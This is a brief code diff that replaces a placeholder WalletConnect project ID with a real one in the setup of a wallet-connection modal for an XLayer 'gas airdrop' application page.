@@ -3,7 +3,7 @@ import { WalletConnectModalSign } from "@walletconnect/modal-sign-html";
 
 // 初始化 WalletConnect
 const modal = new WalletConnectModalSign({
-  projectId: "YOUR_PROJECT_ID",
+  projectId: "310356f4b71b2f49dee3048bcf68240d",
   metadata: {
     name: "Xuseless Gas Airdrop",
     description: "XLayer Gas 空投申请",
